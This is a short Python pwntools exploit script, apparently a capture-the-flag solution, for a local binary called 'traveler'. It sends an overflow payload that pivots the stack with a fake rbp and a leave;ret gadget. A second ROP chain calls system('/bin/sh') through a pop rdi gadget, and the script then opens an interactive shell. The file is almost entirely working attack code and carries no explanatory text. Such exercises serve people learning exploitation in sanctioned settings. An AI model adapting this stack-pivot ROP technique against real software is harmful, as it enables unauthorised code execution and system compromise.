#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./traveler')
elf = ELF('./traveler')

def pr(a,addr):
	log.success(a+': '+hex(addr))

buf = 0x4040a0
fake_rbp = 0x404900
main_puts_read = 0x40120A
leave_ret = 0x401253
prdi_ret = 0x4012c3
system_plt = 0x401090

p.recvuntil('who r u?')
payload1 = 'A'*0x20 + p64(fake_rbp) + p64(main_puts_read)
p.send(payload1)

#gdb.attach(p)
#pause()
p.recvuntil('How many travels can a person have in his life?')
p.send('/bin/sh')

#main_puts_read
p.recvuntil('who r u?')
payload2 = p64(prdi_ret) + p64(buf) + p64(system_plt) + p64(0) + p64(fake_rbp-0x20-0x8) + p64(leave_ret)
p.send(payload2)

p.recvuntil('How many travels can a person have in his life?')
p.send('/bin/sh')

p.interactive()